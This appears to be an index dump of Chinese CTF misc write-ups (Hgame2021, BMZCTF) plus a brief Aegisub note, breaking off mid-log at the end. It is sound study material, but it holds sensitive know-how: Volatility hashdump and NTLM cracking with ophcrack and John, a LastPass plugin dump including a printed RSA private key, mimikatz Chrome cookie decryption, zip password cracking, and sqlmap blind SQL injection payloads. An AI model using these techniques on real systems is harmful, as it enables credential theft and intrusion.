过滤dns协议，得到以下6条 找response类型的流量，点开Domain Name System(response)下的Answers，按理来说会有TXT，内容是flag，但是必然没这么明显的原题。在唯一一个UDP流量里面找到了服务器ip的端口，尝试curl和nc访问，拒绝了。应该不是这么做的。 binwalk一下，得到一个html，拿出来扔winhex发现hint: Do you know SPF? 搜索关键词DNS SPF，找到这篇文章。https://blog.csdn.net/weixin_34232617/article/details/91699242 我们需要查询SPF记录，那么使用dig指令，域名是流量中的flag.hgame2021.cf dig txt flag.hgame2021.cf hgame{D0main_N4me_5ystem} 20:00:00~21:33:12，一个半多小时ak了misc，在misc的学习路途上也算有些进步了吧。 Week 3 week3巨难，爆了零。 A R K 第一次遇到。可见我的见识是多么浅薄。拿到流量包操作了一通啥也没出来，这次不像上周有那么好的资料可查了，直接放弃了 FTP流量分析和TLS流量分析，从FTP流量入手，选中FTP-DATA追踪TCP流，另存为可得到ssl.log 导入后可解密TLS流量。 导出为HTTP对象，结合hint明⽇⽅⾈是⼀款塔防游戏，可以将可部署单位放置在场地中。并且具有⾃律功能，可以记录部署的 操作。 getbattleReplay在battleStart之前，结合其翻译不难得知这个就是⾃律的数据，且第⼆个才是服 务端返回给客⼾端的数据，根据 Content-type 将其导出为 json 里面有一串b64，解得一个zip文件，解压提示文件损坏，查看头是504B0506，将其修改为504B0304即可解压出default_entry，都是json代码 抄脚本 import json5 import numpy as np from PIL import Image def json2img(src: str, o: str): flagJson = json5.loads(open(src, 'r').read()) resImg = Image.new('RGB', (100,100), (255,255,255)) resArr = np.array(resImg) for dusk in flagJson['journal']['logs']: resArr[dusk['pos']['row']][dusk['pos']['col']] = (0,0,0) resImg = Image.fromarray(resArr).convert('RGB') resImg.save(o) json2img('default_entry.json', 'res.png') 扫描二维码 hgame{Did_y0u_ge7_Dusk?} A R C 附件弄下来，8558.png里的内容抄下来解b85解b58后啥也没得到，对付压缩包BVenc(10001540).7z，把10001540拿去加密成BV号作为解压密码，错了，还有个tables.ttf字体文件，搞不懂有啥用，放弃了。后来更新了hint，也懒得看了直接被搞自闭。 看了wp才知道解完b85后那一串是一个表，而且还要学习一下BV号的原理才能写出对应的编码脚本。 还是抄。 # table='fZodR9XQDSUm21yCkr6zBqiveYah8bt4xsWpHnJE7jL5VG3guMTKNPAwcF' # 原表 table='h8btxsWpHnJEj1aL5G3gBuMTKNPAwcF4fZodR9XQ7DSUVm2yCkr6zqiveY' # 我换的表 tr={} for i in range(58): tr[table[i]]=i s=[11,10,3,8,4,6] xor=177451812 add=8728348608 def dec(x): r=0 for i in range(6): r+=tr[x[s[i]]]*58**i return (r-add)^xor def enc(x): x=(x^xor)+add r=list('BV1 4 1 7 ') for i in range(6): r[s[i]]=table[x//58**i%58] return ''.join(r) print(enc(10001540)) # BV17f411J77h 解压打开arc.mkv搜一下视频里的问题，答案是42，视频末尾有两行字符串#)+F7IIMEH:?Injiikffi和pwbvmpoakiscqdobil，再看fragment.txt都是无意义的东西，带有空格，结合hint⽤了某种ROT的范围，但是位移不⼀样。词频分析是个好东西，别忘了视频⾥的问题。 字符范围是 ROT47 的，但是位移换成了 42 (实际上出题时是 52，这样再转回来就是 42) 解密后只有前两⾏是有⽤的信息，先看第⼀⾏： Flag is not here, but I write it because you may need more words to analysis what encoding the line1 is.得知视频⾥第⼀⾏也是和 fragment.txt ⼀样 #)+F7IIMEH:?Injiikffi MSUpasswordis:6557225 ⽤所给的软件和 MSU 搜索可以找到：https://www.compression.ru/video/stego_video/index_en.htm l 安装提供软件，将插件导⼊ plugins32 ⽂件夹，启动 VirtualDub.exe ，导⼊视频： Video -&gt; Filters -&gt; Add -&gt; MSU StegoVideo 1.0，弹出 MSU StegoVideo 插件界⾯。选择 Extract file from video，并填好密码和分离出的⽂件的路径： OK -&gt; OK，回到主界⾯，进度条拉到视频最开始处，File -&gt; Save Video，随便选⼀下输出路径，得到隐 写的 txt ⽂件： arc.hgame2021.cf Hikari Tairitsu 打开⽹站，输⼊⽤⼾名和密码： 继续去看第⼆⾏： For line2, Liki has told you what it is, and Akira is necessary to do it. 有的东西可以参考Crypto WEEK-1 第⼀题。 Crypto WEEK-1 ⾥⽤到 Liki 的只有维吉尼亚密码，所以是 Vigenere-Akira： pwbvmpoakiscqdobil pmtempestissimobyd / 不是可输⼊的意思，是⽹站路径 所以访问 https://arc.hgame2021.cf/pmtempestissimobyd 得 flag： hgame{Y0u_Find_Pur3_Mem0ry} accuracy 新上的题，直接就没打。也幸亏没打，看了wp才知道是机器学习，学个屁 直接贴wp ⾸先有两个附件,⼀个 zip 包,⾥⾯装了⼀万多张图⽚,每张图⽚是⿊⽩图像,⻓宽 28×28 ,如果有接触过 MNIST （作为校内 Hint 放出过）的同学可能会发现,数字部分实际上很像,而字⺟部分也极为相似,另⼀ 个附件是⼀个 csv ⽂件,⾏数不是重点,⼀⾏代表⼀个记录,总共 785 列,实际上,不算上第⼀列的 label ,只 有 784 列, 28×28=78428×28=78428×28=784 ,并且随机挑⼏列出来查看,数据最⼤不过 255 ,最小不低于 0 ,很可能是 28*28 的 图像数据的记录,这道题的做法⼗分简单,把压缩包⾥所有的图⽚的数字都识别出来,按顺序组成字符串,粘 贴到题⽬给的⽹址中提交即可。为了降低难度,实际上压缩包⾥的图⽚都是从 .csv ⽂件中提取出来的,只 不过为了防⽌暴⼒匹配,所有的⾮ 0 部分都被减了 1 ,官⽅解法为训练⼀个神经⽹络进⾏识别,由于提交时 有要求准确率要在 95% 以上,因此训练⼀个⼀般的模型即可, 以下给出数据分析及训练脚本 #%% import numpy as np import pandas as pd import matplotlib.pyplot as plt import tensorflow as tf import seaborn as sns import os from sklearn.preprocessing import MinMaxScaler from sklearn.model_selection import train_test_split sns.set() gpus = tf.config.experimental.list_physical_devices(device_type='GPU') for gpu in gpus: tf.config.experimental.set_memory_growth(gpu, True) os.environ['CUDA_VISIBLE_DEVICES']='0' #%% dataset_path = &quot;full_Hex.csv&quot; dataset = pd.read_csv(dataset_path).astype('float32') #dataset.rename(columns={'0': 'label'}, inplace=True) #%% X = dataset.drop('label',axis = 1) y = dataset['label'] #%% print(&quot;shape:&quot;,X.shape) print(&quot;culoms count:&quot;,len(X.iloc[1])) print(&quot;784 = 28X28&quot;) #%% from sklearn.utils import shuffle X_shuffle = shuffle(X) #%% plt.figure(figsize = (12,10)) row, colums = 4, 4 for i in range(16): plt.subplot(colums, row, i+1) plt.imshow(X_shuffle.iloc[i].values.reshape(28,28),interpolation='nearest', cmap='Greys') plt.show() # %% # Change label to alphabets alphabets_mapper = {0:'0',1:'1',2:'2',3:'3',4:'4',5:'5',6:'6',7:'7',8:'8',9:'9',10:'A',11:'B',12:'C',13:'D',14:'E',15:'F'} dataset_alphabets = dataset.copy() dataset['label'] = dataset['label'].map(alphabets_mapper) label_size = dataset.groupby('label').size() label_size.plot.barh(figsize=(10,10)) plt.show() # %% X_train, X_test, y_train, y_test = train_test_split(X,y) # scale data standard_scaler = MinMaxScaler() standard_scaler.fit(X_train) X_train = standard_scaler.transform(X_train) X_test = standard_scaler.transform(X_test) # %% 然后利⽤训练出来的模型识别压缩包⾥的⽂件 print(&quot;Data after scaler&quot;) X_shuffle = shuffle(X_train) plt.figure(figsize = (12,10)) row, colums = 4, 4 for i in range(16): plt.subplot(colums, row, i+1) plt.imshow(X_shuffle[i].reshape(28,28),interpolation='nearest', cmap='Greys') plt.show() # %% X_train = X_train.reshape(X_train.shape[0], 28, 28, 1).astype('float32') X_test = X_test.reshape(X_test.shape[0], 28, 28, 1).astype('float32') y_train = tf.keras.utils.to_categorical(y_train) y_test = tf.keras.utils.to_categorical(y_test) # %% from tensorflow.keras.layers import Conv2D,MaxPooling2D,Dropout,Flatten,Dense cls = tf.keras.models.Sequential() cls.add(Conv2D(32, (5, 5), input_shape=(28, 28, 1), activation='relu')) cls.add(MaxPooling2D(pool_size=(2, 2))) cls.add(Dropout(0.3)) cls.add(Flatten()) cls.add(Dense(128, activation='relu')) cls.add(Dense(64, activation='relu')) cls.add(Dense(len(y.unique()), activation='softmax')) # %% # start trainning cls.compile(loss='categorical_crossentropy', optimizer='adam', metrics= ['accuracy']) history = cls.fit(X_train, y_train, validation_data=(X_test, y_test), epochs=5, batch_size=200, verbose=2) scores = cls.evaluate(X_test,y_test, verbose=0) print(&quot;CNN Score:&quot;,scores[1]) # %% # 数据分析 plt.plot(history.history['loss']) plt.plot(history.history['val_loss']) plt.title('Model loss') plt.ylabel('Loss') plt.xlabel('Epoch') plt.legend(['Train', 'Test'], loc='upper left') plt.show() # %% # 结果保存 cls.save('my_Hex_full_model_2.h5') # %%#%% import numpy as np import pandas as pd import matplotlib.pyplot as plt import tensorflow as tf import seaborn as sns import os from sklearn.preprocessing import MinMaxScaler from sklearn.model_selection import train_test_split sns.set() gpus = tf.config.experimental.list_physical_devices(device_type='GPU') for gpu in gpus: tf.config.experimental.set_memory_growth(gpu, True) os.environ['CUDA_VISIBLE_DEVICES']='0' #%% dataset_path = &quot;full_Hex.csv&quot; dataset = pd.read_csv(dataset_path).astype('float32') #dataset.rename(columns={'0': 'label'}, inplace=True) #%% X = dataset.drop('label',axis = 1) y = dataset['label'] #%% print(&quot;shape:&quot;,X.shape) print(&quot;culoms count:&quot;,len(X.iloc[1])) print(&quot;784 = 28X28&quot;) #%% from sklearn.utils import shuffle X_shuffle = shuffle(X) #%% plt.figure(figsize = (12,10)) row, colums = 4, 4 for i in range(16): plt.subplot(colums, row, i+1) plt.imshow(X_shuffle.iloc[i].values.reshape(28,28),interpolation='nearest', cmap='Greys') plt.show() # %% # Change label to alphabets alphabets_mapper = {0:'0',1:'1',2:'2',3:'3',4:'4',5:'5',6:'6',7:'7',8:'8',9:'9',10:'A',11:'B',12:'C',13:'D',14:'E',15:'F'} dataset_alphabets = dataset.copy() dataset['label'] = dataset['label'].map(alphabets_mapper) label_size = dataset.groupby('label').size() label_size.plot.barh(figsize=(10,10)) plt.show() # %% X_train, X_test, y_train, y_test = train_test_split(X,y) # scale data standard_scaler = MinMaxScaler() standard_scaler.fit(X_train) X_train = standard_scaler.transform(X_train) X_test = standard_scaler.transform(X_test) # %% 然后利⽤训练出来的模型识别压缩包⾥的⽂件 print(&quot;Data after scaler&quot;) X_shuffle = shuffle(X_train) plt.figure(figsize = (12,10)) row, colums = 4, 4 for i in range(16): plt.subplot(colums, row, i+1) plt.imshow(X_shuffle[i].reshape(28,28),interpolation='nearest', cmap='Greys') plt.show() # %% X_train = X_train.reshape(X_train.shape[0], 28, 28, 1).astype('float32') X_test = X_test.reshape(X_test.shape[0], 28, 28, 1).astype('float32') y_train = tf.keras.utils.to_categorical(y_train) y_test = tf.keras.utils.to_categorical(y_test) # %% from tensorflow.keras.layers import Conv2D,MaxPooling2D,Dropout,Flatten,Dense cls = tf.keras.models.Sequential() cls.add(Conv2D(32, (5, 5), input_shape=(28, 28, 1), activation='relu')) cls.add(MaxPooling2D(pool_size=(2, 2))) cls.add(Dropout(0.3)) cls.add(Flatten()) cls.add(Dense(128, activation='relu')) cls.add(Dense(64, activation='relu')) cls.add(Dense(len(y.unique()), activation='softmax')) # %% # start trainning cls.compile(loss='categorical_crossentropy', optimizer='adam', metrics= ['accuracy']) history = cls.fit(X_train, y_train, validation_data=(X_test, y_test), epochs=5, batch_size=200, verbose=2) scores = cls.evaluate(X_test,y_test, verbose=0) print(&quot;CNN Score:&quot;,scores[1]) # %% # 数据分析 plt.plot(history.history['loss']) plt.plot(history.history['val_loss']) plt.title('Model loss') plt.ylabel('Loss') plt.xlabel('Epoch') plt.legend(['Train', 'Test'], loc='upper left') plt.show() # %% # 结果保存 cls.save('my_Hex_full_model_2.h5') # %% 然后利⽤训练出来的模型识别压缩包⾥的⽂件 import pandas as pd import matplotlib.pyplot as plt import numpy as np import tensorflow as tf import tensorflow.keras as keras import os alphabets_mapper = {0:'0',1:'1',2:'2',3:'3',4:'4',5:'5',6:'6',7:'7',8:'8',9:'9',10:'a',11:'b',12:' c',13:'d',14:'e',15:'f'} gpus = tf.config.experimental.list_physical_devices(device_type='GPU') for gpu in gpus: tf.config.experimental.set_memory_growth(gpu, True) os.environ['CUDA_VISIBLE_DEVICES']='0' model = tf.keras.models.load_model('./my_Hex_full_model_2.h5') imgs = [] def pre(path:str): image_path = path image = tf.keras.preprocessing.image.load_img(image_path,color_mode=&quot;grayscale&quot;) input_arr = keras.preprocessing.image.img_to_array(image) image_arr = 255-input_arr #plt.imshow(image_arr,interpolation='nearest', cmap='Greys') #input_arr = np.array([image_arr]) # Convert single image to a batch. imgs.append(image_arr) #predictions = model.predict(input_arr) #return predictions total = 12272 ans = list() for i in range(total): pre(f&quot;./png/{i}.png&quot;) predictions = model.predict(np.array(imgs)) t = predictions.argmax(axis=1) squarer = lambda t: alphabets_mapper[t] vfunc = np.vectorize(squarer) ans = vfunc(t) with open(f&quot;result.txt&quot;,&quot;w&quot;,encoding=&quot;utf-8&quot;) as e: print(''.join(ans.tolist()),file=e) pytorch 的写法类似,这⾥不再放出, 此模型准确率⼤概在 98% 左右,没有经过精调 Week4 Akira之瞳-1 一看题目就知道是取证了，解压出一个important_work.raw文件 直接扔进volatility ./volatility -f important_work.raw imageinfo 可以看到是win7的镜像 那么用pslist查看进程列表 ./volatility -f important_work.raw --profile=Win7SP1x64 pslist 可以看到一个important_work进程，pid是1092 那么dump下来 ./volatility -f important_work.raw --profile=Win7SP1x64 memdump -p 1092 -D ./ 得到1092.dmp，直接foremost output文件夹下有个zip，备注Password is sha256(login_password) 那么我们需要找到登陆密码并进行sha256加密，直接hashdump ./volatility -f important_work.raw --profile=Win7SP1x64 hashdump Volatility Foundation Volatility Framework 2.6 Administrator:500:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0::: Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0::: Genga03:1001:aad3b435b51404eeaad3b435b51404ee:84b0d9c9f830238933e7131d60ac6436::: 首先把administrator的密码这一行扔进ophcrack，发现无密码，然后把Genga03账号这行扔进去发现解密失败了，做到这，还走了一些弯路，比如说用hivelist去查虚拟地址之类的再dump密码，其实没必要，最后直接去ophcrack的在线解密网站https://www.objectif-securite.ch/ophcrack，使用Genga03的NT-hash，也就是84b0d9c9f830238933e7131d60ac6436来解，解得密码:asdqwe123，再对其进行sha256加密，得到20504cdfddaad0b590ca53c4861edd4f5f5cf9c348c38295bd2dbf0e91bca4c3 解压得两张图片，Blind.png和src.png，一看就知道是盲水印，脚本伺候 python3 bwmforpy3.py decode src.png Blind.png flag.png hgame{7he_f1ame_brin9s_me_end1ess_9rief} Akira之瞳-2 secret_work.raw和secret.7z，volatility伺候 ./volatility -f secret_work.raw imageinfo 还是Win7SP1x64系统 ./volatility -f secret_work.raw --profile=Win7SP1x64 pslist 看到一个notepad.exe和许多chrome.exe，iehistory看了下浏览器记录，发现打开了一哥dumpme.txt filescan后dumpfiles ./volatility -f secret_work.raw --profile=Win7SP1x64 filescan | grep dumpme.txt Volatility Foundation Volatility Framework 2.6 0x000000007ef94820 2 0 RW-r-- \\Device\\HarddiskVolume1\\Users\\Genga03\\Desktop\\dumpme.txt 0x000000007f2b5f20 2 0 RW-rw- \\Device\\HarddiskVolume1\\Users\\Genga03\\AppData\\Roaming\\Microsoft\\Windows\\Recent\\dumpme.txt.lnk 带lnk那个是个快捷方式，不用管，地址是0x000000007ef94820 ./volatility -f secret_work.raw --profile=Win7SP1x64 dumpfiles -Q 0x000000007ef94820 -D ./ 得到file.None.0xfffffa801aa35340.dat 丢进winhex发现 zip password is: 5trqES&amp;P43#y&amp;1TO And you may need LastPass 解压得到一个空文件夹S-1-5-21-262715442-3761430816-2198621988-1001，一个container和一个Cookies，不知道有啥用，结合hint看需要lastpass，安装之后不会用，搜了一下怎么从cookies读取某个密码没啥结果，Cookies丢进winhex可以看到是SQLite文件，用SQLite查看器看不到什么东西。再往下翻有VeraCrypt的字眼，那应该是container就是VeraCrypt加密过的文件，key就通过lastpass和cookies得到。就卡在这了，等待wp。 看了官方wp之后才知道用的是volatility的lastpass插件，结合关键词其实应该用&quot;lasspass 内存取证&quot;这种组合来搜，一下子就能得到相关文章，进而应该能很顺利的解出这道题。真是太可惜了。不过还是学习了mimikatz的使用，毕竟之前没接触过。 使用mimikatz解密cookies，要找到登陆密码，用volatility的lastpass插件(这个插件我装它和库前前后后磨蹭了两个小时，为了使用插件把之前的纯净可执行volatility改成py文件模式了) vol.py -f secret_work.raw --profile=Win7SP1x64 lastpass Searching for LastPass Signatures Found pattern in Process: chrome.exe (3948) Found pattern in Process: chrome.exe (3948) Found pattern in Process: chrome.exe (3948) Found pattern in Process: chrome.exe (3948) Found pattern in Process: chrome.exe (2916) Found pattern in Process: chrome.exe (2916) Found pattern in Process: chrome.exe (2916) Found pattern in Process: chrome.exe (2916) Found pattern in Process: chrome.exe (2916) Found pattern in Process: chrome.exe (1160) Found pattern in Process: chrome.exe (1160) Found pattern in Process: chrome.exe (1160) Found pattern in Process: chrome.exe (1160) Found LastPass Entry for live.com UserName: windows login &amp; miscrosoft Pasword: Unknown Found LastPass Entry for live.com,bing.com,hotmail.com,live.com,microsoft.com,msn.com,windows.com,windowsazure.com,office.com,skype.com,azure.com UserName: windows login &amp; miscrosoft Pasword: vIg*q3x6GFa5aFBA Found Private Key LastPassPrivateKey&lt;308204BB020100300D06092A864886F70D0101010500048204A5308204A10201000282010100BF794F57D296731F67FD1007BEB13A7732DE75CEB688A0A0B8A4C9DE5D0757E83F9CE8EED14346977C72C65F2C2834F150D9FB54086531896CDEFD6D8F4A5CCA2D39E0ADCB24AA6EE075579E9C6631588E9474F6B91B9D1D4D23E55442FA4E89D6810A764CCCEB224DB045DE8E9B17D3A0E561F96D4F414E775A76EA74031AB0EDAB640D1D5FFB8B83F7F7F0CA2D415F9E68CB9DB1AB6028012724AE5674FCC5C0C6085FD2A5C39E785E36C899166120893095779104A123090681914834E063FD433E0F54A221BFA6B344F76B270D1FB5FBC5A7385911A0222A65FD7FDA3573F1A9C8C8B75003664DC998FB6BAB048D65F0A44A23E1446E299A4323280A13ED020111028201000B435F052A815210E7FFD3C43864C734302B341B37E9EB54BF91390D1487F61CB872A44A488B7C9F7FCA8423B74DA8C2E6A369230F8D7B626FD0E1BB268BE7572FD63A64937AA09D1C43234590BAB79BCC26D9B429019FD48C112B9B8B7822BCD061F18E7CFCFEC5C855A9C1CC273DA30976E7A542AA4F22BBBA06FEBB87B6468A44BD7E57DA570AB63E1A013AD75AC3B6B3927D274769E4774B7DC66DC10CA337465A39221C062B9B96BF4E8BF484C3F171A40E41B6D32FC417E0A54EFEE8896346947F7CB40B382F2D8AB78D6CD040570FAC76C0497CC3A677B884B6208157E482D42B0CD675C7F52F50AAA221C076F2604475B4A3F766B9B0103DA11633ED02818100FE8270E2DD0E11837ECDE3E61EED958F59F0FC906A46082A9C38ED503968174F233CC4A7E95F1DF125CEDAAF56A374B986883CFD803FCE883378DCBB43EBDBB631E6069D3151572368206134BB850E3B47638C8E5CB4F4A742D30D87876BB76ACEEA9A0EEB6BB5301A5E730C976F660693BA37E9A73F66140F3EE3E6058687B702818100C0985DC66AD22251EB0A59F5C2F2A4D1228B14BDABA74FD178EADD30D33B0E9FF1DD45ECA56A3CC7FD8CA7E1F7361B63FA1C7387B3A0CC6ECFF7B9DBC55B938E33AD5AFADB5C0BE11C8CAD924B682A9EA68DC53616C2D3FAD16417A5E045E732F60F17DDF1A67BEEEB46CA9A0FFDD6A0B9D1E08F7DBE7087C5AA4B25700A197B0281801DF13A750AF298A60EEB0BC0B8582FB6830D4AE3D044796E6CBB67369D578A458BACCBD784DE0385C8367414A0C7EF9D5B1F163BF0F872A69CA4CEAC9E9437F7512A1EE55118A0D6FD30FC608E881FCABD1AC53DECC9FEAA4418D46A4C2ACA48CD0C8A9857EE8DC96C8395108A49574C116133C122BC2A207A43A2574BF1B59D0281805AA20E03051797AE14411B4679DB98DAE31445FEE75DCB3566142BDABDC1704B44A45D24119B67E5A47E6D1F0AEC491FFD3A90B85487E7BBAD2948676BEEDC06AEE82AD0673A5FF176D8CA26BA12E6E13F51C637923D90EE80A792A8698A4EAE91E8FC2C357B859D9BE5140C43C2BF5AB1CC2D70B3A4E9A94DF5C9028F13CFC102818100AAFE94334DE0035FE8673623497290B5D059E6176FB785D83A2EA157C2E3B335E2E264DC5D7EBB73E0348E7578D956F1AF59E81D9FC24FFB23A61B262184A0B06B4A0F79A750E0EFE776646CFF6ACDB2A2A4CFFBDEC64DA06F05A76A8028CC3E0D487A21C4EADA734DADEDC8280528892E07FBC98DC47B0E2ED1E69EDA479D05&gt;LastPassPrivateKey 下面的一大串private key不用管它，注意的是Pasword: vIg*q3x6GFa5aFBA 这个是用mimikatz解密cookies的密码，在kali里把mimikatz拿到windows下运行 然后用masterkey解密cookies mimikatz # dpapi::chrome /in:&quot;Cookies&quot; 这样就得到了VeraCrpyt的密码，解开container得到ADS.jpg，用NtfsStreamsEditor扫出flag.txt hgame{Which_0nly_cryin9_3yes_c4n_de5cribe} ","link":"http://ayanagi.fun/Hgame2021/"},{"title":"特效轴入门","content":"aegisub文件结构 进入到aeg的目录，关注的是automation、catalog、locale和csri文件夹，config.json、hotkey.json automation : 文件夹下存放一些关于自动化的插件(autoload下)，一些函数库(include下) csri : 存放字幕滤镜，例如vsfiltermod config.json: 基础设置 hotkey.json : 热键设置文件 catalog : 样式库，存放以.sty结尾的字幕样式文件 字幕的样式以一条这样的语句构成 Style: Default,Arial,20,&amp;H00FFFFFFF,&amp;H00FFFFFF,&amp;H000000FF,&amp;H00000000,&amp;H00000000,0,0,0,0,100,100,0,0,1,2,2,2,10,10,10,1 一些字体字号等不赘述。其中，带&amp;H的是颜色标签，由两部分组成 : 1字节的透明标签和3字节的颜色代码，H代表的是16进制的表头，表示后面的数据是16进制，颜色顺序是B G R。 颜色标签之后的参数代表的是边距、边框、杂项等内容，在样式编辑器里有对应。 locale ： 语言库 打k插件 自行安装，后面会用到 https://blog.csdn.net/Seekladoom/article/details/104235193 Karaoke 作用 ： 划分音节和时间 规范 ： 标识符 | 标点{\\k1} k标签 ：{\\k$} {} : aeg标记{}内的内容为特效区，$ : 时间划分 单位是1cs = 10ms; ko : 与k类似，但取消了字幕的边框 特殊音节 : | : 注音 ","link":"http://ayanagi.fun/ROASTMEAT/"},{"title":"BMZCTF misc 随手部分wp","content":"刷的时候随手就写了，但是刷着刷着又懒得写了。于是就这样吧 2018 hackergame Word 文档 直接把文档binwalk了，直接看到flag.txt memory 内存镜像文件，题目的描述是：分析内存镜像,破解管理员的登录密码,flag为明文密码的MD5值 使用volatility volatility -f memory imageinfo 先查看镜像的大概信息，发现suggested profile是WinXPSP2x86,WinXPSP3x86 (Instantiated with WinXPSP2x86)使用hashdump命令把内存中所有用户的hash全部dump出来 volatility -f memory --profile=WinXPSP2x86 hashdump 得到三行类似于shadow一样的密码串，都复制下来保存成1.txt，使用john爆破 john --wordlist=/usr/share/john/password.lst --rules --format=NT 1.txt --wordlist是字典模式，--rules 是稍微变化的规则，其实不填也行，默认就是。--format是预定义密码破解的类型，有很多，可以通过john --list=formats查看，这里使用了NT类型 得到administrator的密码是123456789，md5加密包上flag{} misc_snake 附件的解压密码使用ook解密 解压后3个文件：process、data、data.jpg 全丢进winhex查看，process是明文的python代码，后缀改成py打开就能发现加密的原理 对照着写一个解密脚本 with open ('snake.jpg','wb') as flag: with open('data.jpg','rb') as f: for i in f.read(): if (i % 2 == 0): i = (i+1) ^ 128 else: i = (i-1) ^128 i = bytes([i]) flag.write(i) 得到snake.jpg，使用stegsolve切滤镜可以看到加密方式是serpent，google一个serpent在线解密发现需要密钥，密钥应该就从图片里找，steghide查看到有隐写一个key.txt， steghide extract -sf snake.jpg 得到key:VivaLaVida，去http://serpent.online-domain-tools.com/解密，下载解密后的文件，内容是只有w和b组成的文本，能想到w是white，b是black，批量替换，w为1，b为0，而且有40000个字符，那就是200*200的正方形，编写脚本绘制图片 from PIL import Image with open (&quot;1.txt&quot;,'r') as d: flag = Image.new('L',(200,200)) plain = d.read() i = 0 for x in range(200): for y in range(200): if (plain[i] == '0'): flag.putpixel([x,y],0) else: flag.putpixel([x,y],255) i += 1 flag.show() 得到一个二维码，扫码得flag MISC_tiga 解压，一个加密的压缩包和一段文本，应该是零宽，但是原来的零宽网站解出来的text是乱码，找了个好点的零宽解密站点https://yuanfux.github.io/zero-width-web/ 得到解压密码，解出第二个压缩包和一张图片，压缩包里有一个加密的压缩包和一个装着好些password.txt的文件夹，CRC32爆破，抄来的脚本 import binascii import string def crack_crc(): print('-------------Start Crack CRC-------------') crc_list = [0x14433530, 0xaf251007, 0xd554e7b6, 0xebb3156, 0xbb474d49, 0x2cb8a39b, 0x75fe76f0] comment = '' chars = string.printable for crc_value in crc_list: for char1 in chars: for char2 in chars: for char3 in chars: res_char = char1 + char2 + char3 char_crc = binascii.crc32(res_char.encode()) calc_crc = char_crc &amp; 0xffffffff if calc_crc == crc_value: print('[+] {}: {}'.format(hex(crc_value),res_char)) comment += res_char print('-----------CRC Crack Completed-----------') print('Result: {}'.format(comment)) if __name__ == '__main__': crack_crc() 密码T&amp;hg%WL0^rm@c!VK$xEt~，图片丢winhex在尾巴看到hint:加密压缩包的密码是10位数字，使用掩码爆破，2001701725 得到youcanalso.jpg和flag.zip，压缩包里有youcanalso.jpg，那么就是明文攻击了，把youcanalso.jpg添加成压缩包，CRC32值和压缩包里的相同，开始攻击，这里要注意一下，winrar压缩是无法明文攻击的，需要使用bandzip来压缩才可以。 出来密码1amT1G@，得到flag.txt内容是504B开头的串，粘贴进010editor保存为zip，一看是word类型的文件，改后缀为docx，打开发现好几页base加密，估计是全家桶，使用basecrack的m模式全解出来 python basecrack.py --magic 然后粘贴word的内容 flag{8fa3e8c4-0121-4f2a-a7f0-0a60032e3763} pcap 题目要求分析dno3.0协议的流量，wireshark打开，先筛出来，查看 Distributed Network Protocol 3.0&gt; Application Layer&gt;RESPONSE Data OBjects&gt; Object(s): 32-Bit Counter Change Event...&gt; Point Number 0(Quality: Online), Count:102....&gt;Counter(32 bit):102 这个102转换成字符 就是f，对应的数据包长度是91，按照数据包长度排序，按顺序查看每个数据包能找到对应位置有相应的字符，一个个找f、l、a、g....拼起来就得到了flag。 pcap_analysis 要求分析modbus流量，筛选之后右键追踪流，竖着读flag拼起来就行 SDNISC2020_简单数据包 一个pcapng文件，wireshark打不开，直接binwalk得到一个zip和一个txt，txt内容解b64得flag(binwalk对付流量包老非预期了) 多啦A梦 解压得到多啦A梦.jpg和提示.txt，提示：图片是不是少了点什么？ 直接foremost得到一个二维码png，改宽高扫码解b64得flag 海量的txt文件 几百个txt文件，打开都是没意义的串，放在一个文件夹里，扔kali strings * | grep flag 发现没东西，修改关键词，改成password、pass、key之类的，试到key后找到 key{fe9ff627da72364a} 技协杯-我的密码呢(对付高版本加密) 如果在archpr里压缩包版本不支持，在010editor中把版本改成0就行了 句末大佬的LSB 一张png，复现的时候题目没描述，应该是用cloacked-pixel的lsb脚本，但是没出来。查wp 密码需要社工到句末师傅的姓氏，chen python lsb.py extract jumo.png flag.txt chen HEBTUCTF{wuinoknadsflmladflnef} 日志审计 下载附件logcheck.log打开找到盲注的记录如下 192.168.0.1 - - [13/Oct/2018:12:38:14 +0000] &quot;GET /flag.php?user=hence%27%20AND%20ORD%28MID%28%28SELECT%20IFNULL%28CAST%28secret%20AS%20CHAR%29%2C0x20%29%20FROM%20haozi.secrets%20ORDER%20BY%20secret%20LIMIT%200%2C1%29%2C1%2C1%29%29%3D102--%20pZaF HTTP/1.1&quot; 200 327 &quot;-&quot; &quot;sqlmap/1.2#pip (http://sqlmap.org)&quot; 192.168.0.1 - - [13/Oct/2018:12:38:14 +0000] &quot;GET /flag.php?user=hence%27%20AND%20ORD%28MID%28%28SELECT%20IFNULL%28CAST%28secret%20AS%20CHAR%29%2C0x20%29%20FROM%20haozi.secrets%20ORDER%20BY%20secret%20LIMIT%200%2C1%29%2C2%2C1%29%29%3D108--%20pZaF HTTP/1.1&quot; 200 327 &quot;-&quot; &quot;sqlmap/1.2#pip (http://sqlmap.org)&quot; 192.168.0.1 - - [13/Oct/2018:12:38:14 +0000] &quot;GET /flag.php?user=hence%27%20AND%20ORD%28MID%28%28SELECT%20IFNULL%28CAST%28secret%20AS%20CHAR%29%2C0x20%29%20FROM%20haozi.secrets%20ORDER%20BY%20secret%20LIMIT%200%2C1%29%2C3%2C1%29%29%3D97--%20pZaF HTTP/1.1&quot; 200 327 &quot;-&quot; &quot;sqlmap/1.2#pip (http://sqlmap.org)&quot; 192.168.0.1 - - [13/Oct/2018:12:38:14 +0000] &quot;GET /flag.php?user=hence%27%20AND%20ORD%28MID%28%28SELECT%20IFNULL%28CAST%28secret%20AS%20CHAR%29%2C0x20%29%20FROM%20haozi.secrets%20ORDER%20BY%20secret%20LIMIT%200%2C1%29%2C4%2C1%29%29%3D103--%20pZaF HTTP/1.1&quot; 200 327 &quot;-&quot; &quot;sqlmap/1.2#pip (http://sqlmap.org)&quot; 192.168.0.1 - - [13/Oct/2018:12:38:14 +0000] &quot;GET /flag.php?user=hence%27%20AND%20ORD%28MID%28%28SELECT%20IFNULL%28CAST%28secret%20AS%20CHAR%29%2C0x20%29%20FROM%20haozi.secrets%20ORDER%20BY%20secret%20LIMIT%200%2C1%29%2C5%2C1%29%29%3D123--%20pZaF HTTP/1.1&quot; 200 327 &quot;-&quot; &quot;sqlmap/1.2#pip (http://sqlmap.org)&quot; 192.168.0.1 - - [13/Oct/2018:12:38:14 +0000] &quot;GET 